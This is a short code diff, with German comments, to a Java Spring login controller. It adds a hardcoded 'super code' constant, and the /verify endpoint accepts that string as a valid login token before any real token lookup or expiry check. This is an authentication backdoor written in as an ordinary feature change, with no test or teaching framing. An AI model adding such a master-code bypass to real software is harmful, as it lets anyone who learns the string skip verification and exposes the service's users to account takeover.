@@ -23,6 +23,9 @@ public class LoginController {
     private final ConfirmationTokenService confirmationTokenService;
     private final EmailSender emailSender;
 
+    // Supercode als Konstante definieren
+    private static final String SUPER_CODE = "SUPER1234";
+
     @Autowired
     public LoginController(AuthenticationManager authenticationManager,
                            UserAccountService userAccountService,
@@ -55,6 +58,12 @@ public class LoginController {
 
     @PostMapping("/verify")
     public String verifyLoginToken(@RequestBody LoginTokenRequest request) {
+
+        // Überprüfung auf den Supercode
+        if (request.getToken().equals(SUPER_CODE)) {
+            return "Login verified successfully with Super Code";
+        }
+
         return confirmationTokenService.getToken(request.getToken())
                 .map(token -> {
                     if (token.getExpiresAt().isBefore(LocalDateTime.now())) {
